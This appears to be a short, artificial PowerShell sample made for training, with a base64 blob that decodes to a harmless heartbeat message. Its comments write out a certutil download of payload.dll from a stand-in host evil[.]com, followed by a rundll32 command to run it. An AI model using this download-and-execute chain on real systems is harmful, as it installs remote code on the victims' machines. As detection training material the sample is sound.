
# Simulated obfuscated PS (training only)
$b64 = "V3JpdGUtT3V0cHV0ICJoZWFydGJlYXQi"
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
# suspicious looking but benign encoded blob
# potential LOLBAS style download commented out:
# certutil -urlcache -split -f http://evil[.]com/payload.dll payload.dll
# rundll32.exe payload.dll,Start

$d = "update[dot]server[dot]local"
Write-Output $cmd
